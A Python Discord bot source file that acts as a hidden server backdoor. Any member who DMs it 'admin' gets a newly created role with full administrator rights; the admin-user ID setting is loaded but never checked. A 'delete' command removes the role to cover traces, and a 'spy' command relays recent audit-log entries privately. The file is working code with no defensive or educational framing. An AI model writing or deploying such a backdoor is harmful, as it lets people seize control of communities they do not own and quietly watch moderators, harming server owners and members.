import discord
from discord.ext import commands

def get_settings():
    settings = {}
    try:
        with open('data.txt', 'r') as file:
            for line in file:
                if line.startswith('TOKEN='):
                    settings['TOKEN'] = line.strip().split('=')[1]
                elif line.startswith('ADMINUSER='):
                    settings['ADMINUSER'] = line.strip().split('=')[1]
                elif line.startswith('ADMIN_SERVER='):
                    settings['ADMIN_SERVER'] = line.strip().split('=')[1]
                elif line.startswith('ROLE_NAME='):
                    settings['ROLE_NAME'] = line.strip().split('=')[1]
    except FileNotFoundError:
        print("Not data.txt")
    return settings

settings = get_settings()
ROLE_NAME = settings.get('ROLE_NAME')

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
intents.guild_reactions = True
intents.guild_scheduled_events = True
intents.members = True

client = commands.Bot(command_prefix='/', intents=intents)

@client.event
async def on_ready():
    print(f'Longin Success!: {client.user}')

@client.event
async def on_message(message):
    if message.author.bot:
        return

    if isinstance(message.channel, discord.DMChannel):
        admin_user_id = int(settings.get('ADMINUSER'))
        guild_id = int(settings.get('ADMIN_SERVER'))

        guild = client.get_guild(guild_id)
        if not guild:
            await message.channel.send("Not Server")
            return

        print(f"Received DM from: {message.author.name}, content: {message.content}")
        print(f"Guild ID: {guild_id}, Guild Name: {guild.name}")

        member = guild.get_member(message.author.id)
        if member is None:
            member = await guild.fetch_member(message.author.id)

        print(f"Member: {member}")

        if member is None:
            await message.channel.send(f"Members are servers `{guild.name}` does not exist in .")
            return

        content = message.content.lower()
        if content == 'admin':
            await admin_command(guild, member, message.channel)
        elif content == 'delete':
            await delete_command(guild, member, message.channel)
        elif content == 'spy':
            await spy_command(guild, message.channel)

async def admin_command(guild, member, channel):
    role = discord.utils.get(guild.roles, name=ROLE_NAME)
    if role:
        await channel.send("The role already exists.")
    else:
        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
        await channel.send(f"`{ROLE_NAME}` is created")

    if role in member.roles:
        await channel.send(f" You have the `{ROLE_NAME}` role.")
    else:
        await member.add_roles(role)
        await channel.send(f"`{ROLE_NAME}` has been granted.")

async def delete_command(guild, member, channel):
    role = discord.utils.get(guild.roles, name=ROLE_NAME)
    if role:
        await role.delete()
        await channel.send(f" `{ROLE_NAME}` has been deleted.")
    else:
        await channel.send(f" `{ROLE_NAME}` does not exist.")

async def spy_command(guild, channel):
    try:
        audit_logs = []
        async for log in guild.audit_logs(limit=10):
            audit_logs.append(log)

        log_messages = []
        for log in reversed(audit_logs):
            action = log.action
            user = log.user.name if log.user else 'Unknown'
            target = log.target
            reason = log.reason if log.reason else 'None'
            timestamp = log.created_at.strftime("%Y-%m-%d %H:%M:%S")

            log_message = f"**{timestamp}** - **Action:** {action}\n**User:** {user}\n**Target:** {target}\n**Reason:** {reason}\n"
            log_messages.append(log_message)

        response_message = '\n'.join(log_messages)
        await channel.send(f"```\n{response_message}\n```")
    except Exception as e:
        await channel.send(f"Error: {e}")
        print(f"Error getting audit logs: {e}") 

TOKEN = settings.get('TOKEN')
if TOKEN:
    client.run(TOKEN)
else:
    print("TOKEN not set")
